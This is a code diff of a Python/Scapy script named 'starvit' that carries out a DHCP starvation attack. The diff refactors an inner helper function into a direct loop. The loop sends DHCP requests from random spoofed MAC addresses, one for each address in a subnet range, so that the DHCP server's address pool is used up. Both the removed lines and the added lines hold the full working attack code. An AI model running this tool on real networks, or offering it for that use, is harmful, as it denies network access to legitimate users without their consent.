@@ -9,34 +9,31 @@ def starvit(ip_subnet="192.168.27.",
             server_id="192.168.27.254",
             layer2_broadcast = "ff:ff:ff:ff:ff:ff"):
     # Stops scapy from checking return packet originating from any packet that we have sent out
-    conf.checkIPaddr = False
-    
-    def dhcp_starvation():
-        for ip in range(start_ip, end_ip):
-            bogus_mac_address = RandMAC()
-            if server_id:
-                dhcp_request = Ether(src=bogus_mac_address, dst=layer2_broadcast)\
-                               /IP(src="0.0.0.0", dst="255.255.255.255")\
-                               /UDP(sport=68, dport=67)\
-                               /BOOTP(chaddr=bogus_mac_address)\
-                               /DHCP(options=[("message-type","request"),
-                                              ("server_id",server_id),
-                                              ("requested_addr", ip_subnet + str(ip)),
-                                              "end"])
-            else:
-                dhcp_request = Ether(src=bogus_mac_address, dst=layer2_broadcast)\
-                               /IP(src="0.0.0.0", dst="255.255.255.255")\
-                               /UDP(sport=68, dport=67)\
-                               /BOOTP(chaddr=bogus_mac_address)\
-                               /DHCP(options=[("message-type","request"),
-                                              #("server_id",server_id),
-                                              ("requested_addr", ip_subnet + str(ip)),
-                                              "end"])
-            sendp(dhcp_request)
-            print("Requesting: " + ip_subnet + str(ip) + "\n")
-            time.sleep(0.2)
-    
-    dhcp_starvation()
+    conf.checkIPaddr = False    
+    for ip in range(start_ip, end_ip):
+        bogus_mac_address = RandMAC()
+        if server_id:
+            dhcp_request = Ether(src=bogus_mac_address, dst=layer2_broadcast)\
+                           /IP(src="0.0.0.0", dst="255.255.255.255")\
+                           /UDP(sport=68, dport=67)\
+                           /BOOTP(chaddr=bogus_mac_address)\
+                           /DHCP(options=[("message-type","request"),
+                                          ("server_id",server_id),
+                                          ("requested_addr", ip_subnet + str(ip)),
+                                          "end"])
+        else:
+            dhcp_request = Ether(src=bogus_mac_address, dst=layer2_broadcast)\
+                           /IP(src="0.0.0.0", dst="255.255.255.255")\
+                           /UDP(sport=68, dport=67)\
+                           /BOOTP(chaddr=bogus_mac_address)\
+                           /DHCP(options=[("message-type","request"),
+                                          #("server_id",server_id),
+                                          ("requested_addr", ip_subnet + str(ip)),
+                                          "end"])
+        sendp(dhcp_request)
+        print("Requesting: " + ip_subnet + str(ip) + "\n")
+        time.sleep(0.2)
+
             
 if __name__=="__main__":
     import argparse
